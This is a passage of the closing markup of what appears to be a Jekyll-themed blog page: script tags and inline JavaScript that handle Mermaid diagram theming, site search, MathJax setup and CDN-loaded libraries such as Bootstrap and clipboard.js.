src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
